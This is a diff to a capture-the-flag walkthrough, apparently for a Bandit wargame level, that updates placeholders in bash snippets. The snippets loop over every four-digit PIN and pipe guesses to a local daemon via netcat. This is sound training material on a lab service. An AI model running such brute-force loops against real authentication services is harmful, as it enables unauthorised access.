@@ -21,7 +21,7 @@ After the previous level, you can probably imagine that we will be writing a scr
 
 ```bash
 mktemp -d
-cd **temporary directory path**
+cd </tmp path>
 touch script.sh
 chmod 755 script.sh
 nano script.sh
@@ -31,13 +31,13 @@ By this point, we already know two things:
 * We can connect to the listening daemon with the command `nc localhost 30002`
 * We can use a `for` loop like we did in level 16 to go through all 10000 combinations for a 4-digit pincode. We can express the range of different pincodes like this: `{0000..9999}`
 
-With this knowledge, we could construct something such as this
+With this knowledge, we could construct something such as this (remember to change \<password> to the actual previous password):
 
 ```bash
 #!/bin/bash
 nc localhost 30002
 for i in {0000..9999}; do
-	echo "**previous password** $i"
+	echo "<password> $i"
 done 
 ```
 
@@ -46,7 +46,7 @@ The problem with this code is that the `echo` command occurs outside of the `nc`
 ```bash
 #!/bin/bash
 for i in {0000..9999}; do
-	echo "**previous password** $i"
+	echo "<password> $i"
 done | nc localhost 30002
 ```
 
@@ -55,7 +55,7 @@ We could leave it at that, but if you run the script as it is, you will receive 
 ```bash
 #!/bin/bash
 for i in {0000..9999}; do
-	echo "**previous password** $i"
+	echo "<password> $i"
 done | nc localhost 30002 > /tmp/**your directory**/file 
 ```
 
@@ -67,7 +67,7 @@ A way of doing the latter option is using the `-v` option in `grep`, which rejec
 ```bash
 #!/bin/bash
 for i in {0000..9999}; do
-	echo "**previous password** $i"
+	echo "<password> $i"
 done | nc localhost 30002 | grep -v "Wrong" > /tmp/**your directory**/file 
 ```
 
